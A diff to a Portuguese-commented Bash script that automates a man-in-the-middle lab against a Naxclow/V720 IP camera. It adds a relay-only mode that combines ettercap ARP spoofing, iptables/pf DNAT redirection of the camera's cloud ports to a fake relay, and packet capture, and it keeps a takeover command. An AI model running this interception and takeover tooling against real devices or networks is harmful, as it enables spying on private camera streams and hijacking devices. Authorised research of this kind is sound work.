@@ -21,6 +21,7 @@
 #   ./mitm_dns.sh watch [nome]            # tail -F ao vivo
 #   sudo ./mitm_dns.sh dnat on|off        # fallback: desvia IPs fixos do cloud pro fake
 #                                         #   (Linux: iptables DNAT | macOS: pf rdr, EXPERIMENTAL)
+#   sudo ./mitm_dns.sh relay              # relay-only: desvia so 29940/29942 (MQTT/HTTP no cloud real)
 #   sudo ./mitm_dns.sh takeover [cmd...]  # espera camera no MQTT, manda comandos, prova stream
 #   ./mitm_dns.sh cheat                   # passos manuais (camera + PC)
 #   sudo ./mitm_dns.sh bundle             # junta logs+configs num arquivo so
@@ -54,11 +55,11 @@ RESP_WAIT="${RESP_WAIT:-20}"                     # s coletando a resposta da cam
 STREAM_SECS="${STREAM_SECS:-15}"                 # s de captura do /live
 P2P_WAIT="${P2P_WAIT:-30}"                       # s esperando o registro P2P (relay)
 RELAY_PORT="${RELAY_PORT:-29940}"                # porta do "relay" que a camera usa p/ registrar
+FAKE_SRV_RELAY_HOST="${FAKE_SRV_RELAY_HOST:-107.149.143.96}"  # IP publico do relay real (dnat desvia pro fake)
+DNAT_MODE="${DNAT_MODE:-all}"                     # 'all' (80/1883/29940/29942) ou 'relay' (so 29940/29942)
 
-# IPs fixos do cloud (vistos no pcap STA) — usados pelo fallback 'dnat on'
-CLOUD_MQTT_IP="${CLOUD_MQTT_IP:-39.108.132.112}"
-CLOUD_RELAY_IP="${CLOUD_RELAY_IP:-107.149.143.90}"
-CLOUD_RELAY_PORT="${CLOUD_RELAY_PORT:-29942}"
+# Portas do cloud desviadas pelo fallback 'dnat on' (por porta, nao por IP).
+# A camera tem um pool de IPs hardcoded — redirecionar por porta cobre todos.
 
 REPO_ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/../.." && pwd)"
 CMD_SCRIPT="$REPO_ROOT/scripts/fakeserver/fake_srv_cmd.sh"
@@ -133,6 +134,12 @@ port_listen() {  # port_listen 1883
   fi
 }
 
+wait_port() {  # wait_port <porta> [segundos]
+  local port=$1 t=${2:-8} i
+  for ((i=0; i<t; i++)); do port_listen "$port" && return 0; sleep 1; done
+  return 1
+}
+
 fwd_sysctl() { (( IS_MAC )) && echo net.inet.ip.forwarding || echo net.ipv4.ip_forward; }
 
 # acha a camera pelo OUI do fabricante (5c:f1:50) — DHCP muda o IP entre sessoes.
@@ -191,7 +198,7 @@ p2p_registered() {
 # ultimo Device/Info publicado pela camera no broker (proof.log ou mqtt.log)
 last_dev_info() {
   local f="$1"
-  grep -a 'Device/Info' "$f" 2>/dev/null | tail -1 | sed -E 's/^[0-9]{4}-[0-9]{2}-[0-9]{2}T[0-9:]{8}\+0000[[:space:]]+//; s/^[0-9]{10}[[:space:]]+//; s/^Naxclow\/P2P\/Users\/Device\/Info[[:space:]]+//'
+  grep -a 'Device/Info' "$f" 2>/dev/null | tail -1 | sed -E 's/^[0-9]{4}-[0-9]{2}-[0-9]{2}T[0-9:]{8}[+-][0-9]{4}[[:space:]]+//; s/^[0-9]{10}[[:space:]]+//; s/^Naxclow\/P2P\/Users\/Device\/Info[[:space:]]+//'
 }
 
 baseline_info() {
@@ -300,14 +307,27 @@ etter_dns_path() {
 }
 
 # --------------------------------------------------------------- DNAT fallback
+# Redireciona por PORTA (nao por IP) pra cobrir o pool de IPs hardcoded da camera.
+# Portas do cloud: HTTP 80, MQTT 1883, relay 29940/29942 (TCP e UDP).
 dnat_rules_on() {
   if (( IS_MAC )); then
-    # pf rdr: trafego da camera pros IPs fixos do cloud volta pro fake local.
-    # (o ARP spoof ja faz o trafego dela passar pelo Mac)
-    cat > "$PF_ANCHOR" <<EOF
-rdr pass on $IFACE inet proto tcp from $CAM_IP to $CLOUD_MQTT_IP port 1883 -> $MY_IP port 1883
-rdr pass on $IFACE inet proto tcp from $CAM_IP to $CLOUD_RELAY_IP port $CLOUD_RELAY_PORT -> $MY_IP port $RELAY_PORT
+    if [[ "$DNAT_MODE" == "relay" ]]; then
+      cat > "$PF_ANCHOR" <<EOF
+rdr pass on $IFACE inet proto tcp from $CAM_IP to ! $MY_IP port 29940 -> $MY_IP port $RELAY_PORT
+rdr pass on $IFACE inet proto tcp from $CAM_IP to ! $MY_IP port 29942 -> $MY_IP port $RELAY_PORT
+rdr pass on $IFACE inet proto udp from $CAM_IP to ! $MY_IP port 29940 -> $MY_IP port $RELAY_PORT
+rdr pass on $IFACE inet proto udp from $CAM_IP to ! $MY_IP port 29942 -> $MY_IP port $RELAY_PORT
 EOF
+    else
+      cat > "$PF_ANCHOR" <<EOF
+rdr pass on $IFACE inet proto tcp from $CAM_IP to ! $MY_IP port 80 -> $MY_IP port 80
+rdr pass on $IFACE inet proto tcp from $CAM_IP to ! $MY_IP port 1883 -> $MY_IP port 1883
+rdr pass on $IFACE inet proto tcp from $CAM_IP to ! $MY_IP port 29940 -> $MY_IP port $RELAY_PORT
+rdr pass on $IFACE inet proto tcp from $CAM_IP to ! $MY_IP port 29942 -> $MY_IP port $RELAY_PORT
+rdr pass on $IFACE inet proto udp from $CAM_IP to ! $MY_IP port 29940 -> $MY_IP port $RELAY_PORT
+rdr pass on $IFACE inet proto udp from $CAM_IP to ! $MY_IP port 29942 -> $MY_IP port $RELAY_PORT
+EOF
+    fi
     if ! grep -q 'rdr-anchor "mitm_dns"' "$PF_CONF"; then
       cp -n "$PF_CONF" "$OUT_DIR/pf.conf.bak"
       sed -i '' '/^rdr-anchor "com.apple\/\*"/a\
@@ -320,10 +340,15 @@ rdr-anchor "mitm_dns"
       pfctl -e >/dev/null 2>&1 && touch "$RUN_DIR/pf_we_enabled"
     fi
   else
-    iptables -t nat -C PREROUTING -p tcp -d "$CLOUD_MQTT_IP" --dport 1883 -j DNAT --to "$MY_IP:1883" 2>/dev/null \
-      || iptables -t nat -A PREROUTING -p tcp -d "$CLOUD_MQTT_IP" --dport 1883 -j DNAT --to "$MY_IP:1883"
-    iptables -t nat -C PREROUTING -p tcp -d "$CLOUD_RELAY_IP" --dport "$CLOUD_RELAY_PORT" -j DNAT --to "$MY_IP:$RELAY_PORT" 2>/dev/null \
-      || iptables -t nat -A PREROUTING -p tcp -d "$CLOUD_RELAY_IP" --dport "$CLOUD_RELAY_PORT" -j DNAT --to "$MY_IP:$RELAY_PORT"
+    local specs=("tcp 29940 $RELAY_PORT" "tcp 29942 $RELAY_PORT" "udp 29940 $RELAY_PORT" "udp 29942 $RELAY_PORT")
+    [[ "$DNAT_MODE" == "relay" ]] || specs=("tcp 80 80" "tcp 1883 1883" "${specs[@]}")
+    local spec proto dport toport
+    for spec in "${specs[@]}"; do
+      read -r proto dport toport <<< "$spec"
+      iptables -t nat -C PREROUTING -p "$proto" -s "$CAM_IP" ! -d "$MY_IP" --dport "$dport" -j DNAT --to "$MY_IP:$toport" 2>/dev/null \
+        || iptables -t nat -A PREROUTING -p "$proto" -s "$CAM_IP" ! -d "$MY_IP" --dport "$dport" -j DNAT --to "$MY_IP:$toport"
+    done
+    echo "$CAM_IP" > "$RUN_DIR/dnat_cam_ip"
   fi
 }
 
@@ -339,8 +364,14 @@ dnat_rules_off() {
     # so desliga o pf se fomos NOS que ligamos
     [[ -f "$RUN_DIR/pf_we_enabled" ]] && { pfctl -d >/dev/null 2>&1; rm -f "$RUN_DIR/pf_we_enabled"; }
   else
-    iptables -t nat -D PREROUTING -p tcp -d "$CLOUD_MQTT_IP" --dport 1883 -j DNAT --to "$MY_IP:1883" 2>/dev/null || true
-    iptables -t nat -D PREROUTING -p tcp -d "$CLOUD_RELAY_IP" --dport "$CLOUD_RELAY_PORT" -j DNAT --to "$MY_IP:$RELAY_PORT" 2>/dev/null || true
+    local cam spec proto dport toport
+    cam="${CAM_IP}"
+    [[ -f "$RUN_DIR/dnat_cam_ip" ]] && cam=$(cat "$RUN_DIR/dnat_cam_ip")
+    for spec in "tcp 80 80" "tcp 1883 1883" "tcp 29940 $RELAY_PORT" "tcp 29942 $RELAY_PORT" "udp 29940 $RELAY_PORT" "udp 29942 $RELAY_PORT"; do
+      read -r proto dport toport <<< "$spec"
+      iptables -t nat -D PREROUTING -p "$proto" -s "$cam" ! -d "$MY_IP" --dport "$dport" -j DNAT --to "$MY_IP:$toport" 2>/dev/null || true
+    done
+    rm -f "$RUN_DIR/dnat_cam_ip"
   fi
 }
 
@@ -348,7 +379,7 @@ dnat_active() {
   if (( IS_MAC )); then
     pfctl -a mitm_dns -s nat 2>/dev/null | grep -q rdr
   else
-    iptables -t nat -C PREROUTING -p tcp -d "$CLOUD_MQTT_IP" --dport 1883 -j DNAT --to "$MY_IP:1883" 2>/dev/null
+    iptables -t nat -C PREROUTING -p tcp -s "$CAM_IP" ! -d "$MY_IP" --dport 80 -j DNAT --to "$MY_IP:80" 2>/dev/null
   fi
 }
 
@@ -441,13 +472,13 @@ cmd_up() {
 
   say "[2/5] fake server -> $(log_of server)"
   if (( IS_MAC )); then
-    start_bg server "cd '$REPO_ROOT' && PYTHONPATH='$PYPATH_USER' BROKER=$MY_IP FAKE_SRV_HOST=$MY_IP RELAY_PORT=$RELAY_PORT '$PYBIN' src/a9_naxclow.py -s -v"
+    start_bg server "cd '$REPO_ROOT' && PYTHONPATH='$PYPATH_USER' BROKER=$MY_IP FAKE_SRV_HOST=$MY_IP FAKE_SRV_RELAY_HOST=$FAKE_SRV_RELAY_HOST RELAY_PORT=$RELAY_PORT '$PYBIN' src/a9_naxclow.py -s -v"
   else
-    start_bg server "cd '$REPO_ROOT' && BROKER=$MY_IP FAKE_SRV_HOST=$MY_IP RELAY_PORT=$RELAY_PORT '$PYBIN' src/a9_naxclow.py -s -v"
+    start_bg server "cd '$REPO_ROOT' && BROKER=$MY_IP FAKE_SRV_HOST=$MY_IP FAKE_SRV_RELAY_HOST=$FAKE_SRV_RELAY_HOST RELAY_PORT=$RELAY_PORT '$PYBIN' src/a9_naxclow.py -s -v"
   fi
-  sleep 2
-  port_listen 80 && ok "fake server HTTP LISTEN :80" || warn "fake server HTTP nao subiu em :80 — '$0 logs server'"
-  port_listen "$RELAY_PORT" && ok "fake server relay LISTEN :$RELAY_PORT" || warn "fake server relay nao subiu em :$RELAY_PORT — '$0 logs server'"
+  sleep 1
+  wait_port 80 10 && ok "fake server HTTP LISTEN :80" || warn "fake server HTTP nao subiu em :80 — '$0 logs server'"
+  wait_port "$RELAY_PORT" 10 && ok "fake server relay LISTEN :$RELAY_PORT" || warn "fake server relay nao subiu em :$RELAY_PORT — '$0 logs server'"
 
   say "[3/5] etter.dns ($ETTER_DNS): *.naxclow.com[.cn] -> $MY_IP"
 
@@ -504,12 +535,18 @@ cmd_dnat() {
   MY_IP=$(my_ip)
   [[ -n "$MY_IP" ]] || die "interface '$IFACE' sem IPv4"
   mkdir -p "$RUN_DIR"
+  if [[ "$CAM_IP" == auto ]]; then
+    say "procurando a camera pelo OUI 5c:f1:50 ..."
+    CAM_IP=$(discover_cam)
+    [[ -n "$CAM_IP" ]] || die "camera nao achada no ARP (OUI 5c:f1:50)"
+    ok "camera achada: $CAM_IP"
+  fi
   case "${1:-}" in
     on)
       (( IS_MAC )) && warn "no macOS o fallback usa pf rdr (EXPERIMENTAL) — regras em $PF_ANCHOR, anchor no $PF_CONF"
       dnat_rules_on
-      ok "DNAT ativo: $CLOUD_MQTT_IP:1883 -> $MY_IP:1883  |  $CLOUD_RELAY_IP:$CLOUD_RELAY_PORT -> $MY_IP:$RELAY_PORT"
-      say "    (o ARP spoof ja faz o trafego da camera passar por aqui; a regra pega ate conexao pra IP fixo)"
+      ok "DNAT ativo (por porta): 80/1883/29940/29942 -> $MY_IP (cobre o pool de IPs hardcoded)"
+      say "    (o ARP spoof ja faz o trafego da camera passar por aqui)"
       say "    power cycle na camera pra ela refazer as conexoes."
       ;;
     off)
@@ -518,6 +555,69 @@ cmd_dnat() {
       ;;
     *) die "uso: $0 dnat on|off" ;;
   esac
+}
+
+# --------------------------------------------------------------- relay-only
+# ARP spoof + DNAT so do relay (29940/29942). MQTT/HTTP da camera continuam no
+# cloud real, entao o app real dispara o viewer e a camera cai no fake relay.
+cmd_relay() {
+  check_deps
+  local running=0 s
+  for s in server ettercap pcap; do alive "$s" && running=1; done
+  (( running )) && die "lab ja parece no ar ('$0 status'). '$0 down' primeiro."
+
+  MY_IP=$(my_ip)
+  [[ -n "$MY_IP" ]] || die "interface '$IFACE' sem IPv4"
+
+  if [[ "$CAM_IP" == auto ]]; then
+    say "procurando a camera pelo OUI 5c:f1:50 ..."
+    CAM_IP=$(discover_cam)
+    [[ -n "$CAM_IP" ]] || die "camera nao achada no ARP (OUI 5c:f1:50)"
+    ok "camera achada: $CAM_IP"
+  fi
+
+  DNAT_MODE=relay
+  mkdir -p "$OUT_DIR" "$RUN_DIR"
+
+  echo "=================================================================="
+  echo " MITM RELAY-ONLY  ($OS)"
+  echo "   camera   : $CAM_IP"
+  echo "   gateway  : $GW_IP"
+  echo "   atacante : $MY_IP  ($IFACE)"
+  echo "   fake relay : :$RELAY_PORT"
+  echo "   DNAT     : so 29940/29942 -> $MY_IP:$RELAY_PORT"
+  echo "   MQTT/HTTP da camera continuam no cloud REAL"
+  echo "=================================================================="
+  echo " So prosseguir se ESTE equipamento e ESTA rede sao teus / autorizados."
+  read -r -p " Digitar 'SIM' para continuar: " CONFIRM
+  [[ "$CONFIRM" == "SIM" ]] || { echo "abortado."; exit 1; }
+
+  say "[1/3] fake server (relay) -> $(log_of server)"
+  if (( IS_MAC )); then
+    start_bg server "cd '$REPO_ROOT' && PYTHONPATH='$PYPATH_USER' FAKE_SRV_HOST=$MY_IP RELAY_PORT=$RELAY_PORT '$PYBIN' src/a9_naxclow.py -s -v"
+  else
+    start_bg server "cd '$REPO_ROOT' && FAKE_SRV_HOST=$MY_IP RELAY_PORT=$RELAY_PORT '$PYBIN' src/a9_naxclow.py -s -v"
+  fi
+  wait_port "$RELAY_PORT" 10 && ok "fake relay LISTEN :$RELAY_PORT" || warn "fake relay nao subiu em :$RELAY_PORT — '$0 logs server'"
+
+  say "[2/3] ARP spoof (sem DNS spoof) + DNAT relay-only"
+  ORIG_FWD=$(sysctl -n "$(fwd_sysctl)")
+  echo "$ORIG_FWD" > "$RUN_DIR/orig_ip_forward"
+  sysctl -w "$(fwd_sysctl)=1" >/dev/null
+  start_bg ettercap "'$ETTERCAP' -T -q -i '$IFACE' -M arp:remote '/$CAM_IP//' '/$GW_IP//'"
+  sleep 4
+  alive ettercap || { say; tail -n 15 "$(log_of ettercap)" | sed 's/^/    /'; die "ettercap morreu no arranque — '$0 logs ettercap'"; }
+  dnat_rules_on
+  ok "DNAT relay-only ativo (29940/29942 -> $MY_IP:$RELAY_PORT)"
+
+  say "[3/3] captura -> $PCAP (so host $CAM_IP)"
+  start_bg pcap "exec '$TCPDUMP' -i '$IFACE' -n -U host '$CAM_IP' -w '$PCAP'"
+
+  echo
+  ok "no ar. Agora: abrir o viewer da camera no app V720 (deixar streamar ~30s)."
+  say "   acompanhar:  $0 watch"
+  say "   status:      $0 status"
+  say "   derrubar:    $0 down"
 }
 
 # --------------------------------------------------------------- status
@@ -536,9 +636,9 @@ cmd_status() {
   for pt in 80 1883 "$RELAY_PORT"; do
     port_listen "$pt" && say "  :$pt LISTEN" || say "  :$pt —"
   done
-  say "DNAT (fallback IP fixo):"
+  say "DNAT (por porta, cobre pool de IPs):"
   if [[ -n "$MY_IP" ]] && dnat_active; then
-    say "  ATIVO  ($CLOUD_MQTT_IP:1883 -> $MY_IP:1883 ; $CLOUD_RELAY_IP:$CLOUD_RELAY_PORT -> $MY_IP:$RELAY_PORT)"
+    say "  ATIVO  (80/1883/29940/29942 -> $MY_IP)"
   else
     say "  inativo"
   fi
@@ -584,7 +684,7 @@ cmd_watch() {  # [nome...]
 cmd_bundle() {
   local out="$OUT_DIR/report_$(date +%Y%m%d_%H%M%S).txt"
   {
-    echo "### mitm_dns bundle  $(date -Is)  OS=$OS"
+    echo "### mitm_dns bundle  $(date +%Y-%m-%dT%H:%M:%S%z)  OS=$OS"
     echo "### CAM_IP=$CAM_IP GW_IP=$GW_IP IFACE=$IFACE DEV=$DEV RELAY_PORT=$RELAY_PORT"
     echo; echo "===== STATUS ====="; cmd_status
     echo; echo "===== etter.dns ====="; cat "$(etter_dns_path)" 2>/dev/null
@@ -758,6 +858,7 @@ case "${1:-}" in
   down)     need_root; cmd_down ;;
   restart)  need_root; cmd_down; echo; sleep 2; cmd_up ;;
   dnat)     shift; need_root; cmd_dnat "${1:-}" ;;
+  relay)    shift; need_root; cmd_relay ;;
   takeover) shift; need_root; cmd_takeover "$@" ;;
   status)   cmd_status ;;
   logs)     shift; cmd_logs "$@" ;;
